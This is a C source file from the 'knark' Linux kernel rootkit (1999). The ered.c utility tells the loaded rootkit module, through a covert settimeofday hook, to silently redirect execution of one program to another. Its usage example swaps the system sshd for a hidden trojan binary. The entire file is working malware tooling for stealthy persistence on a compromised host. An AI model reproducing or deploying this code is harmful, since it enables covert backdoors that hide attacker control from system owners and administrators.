/*
 * ered.c, part of the knark package
 * (c) Creed @ #hack.se 1999 <creed@sekure.net>
 * 
 * This program may NOT be used in an illegal way,
 * or to cause damage of any kind.
 * 
 * See README for more info.
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <time.h>
#include <sys/time.h>

#include "knark.h"


void usage(const char *progname)
{
    fprintf(stderr,
	    "Usage:\n"
	    "\t%s <from> <to>\n"
            "\t%s -c (clear redirect-list)\n"
	    "ex: %s /usr/local/sbin/sshd /usr/lib/.hax0r/sshd_trojan\n",
	    progname, progname, progname);
    exit(-1);
}


int main(int argc, char *argv[])
{
    struct stat st;
    struct exec_redirect er;
    
    author_banner("ered.c");
    
    if(argc != 3)
    {
	if(argc != 2 || strcmp(argv[1], "-c"))
	    usage(argv[0]);
	
	if(settimeofday((struct timeval *)KNARK_CLEAR_REDIRECTS,
			(struct timezone *)NULL) == -1)
	{
	    perror("settimeofday");
	    fprintf(stderr, "Have you really loaded knark.o?!\n");
	    exit(-1);
	}
	printf("Done. Redirect list is cleared.\n");
	exit(0);
    }
 
    er.er_from = argv[1];
    er.er_to = argv[2];
    
    if(stat(er.er_from, &st) == -1)
	perror("stat"), exit(-1);
    
    if(!S_ISREG(st.st_mode))
    {
	fprintf(stderr, "%s is not a regular file\n", er.er_from);
	exit(-1);
    }

    if(~st.st_mode & S_IXUSR)
    {
	fprintf(stderr, "%s is not an executable file\n", er.er_from);
	exit(-1);
    }
    
    if(stat(er.er_to, &st) == -1)
	perror("stat"), exit(-1);
    
    if(!S_ISREG(st.st_mode))
    {
	fprintf(stderr, "%s is not a regular file\n", er.er_to);
	exit(-1);
    }
    
    if(~st.st_mode & S_IXUSR)
    {
	fprintf(stderr, "%s is not an executable\n", er.er_to);
	exit(-1);
    }
    
    if(settimeofday((struct timeval *)KNARK_ADD_REDIRECT,
		    (struct timezone *)&er) == -1)
    {
	perror("settimeofday");
	fprintf(stderr, "Have you really loaded knark.o?!\n");
	exit(-1);
    }
    
    printf("Done: %s -> %s\n", er.er_from, er.er_to);
    exit(0);
    
}

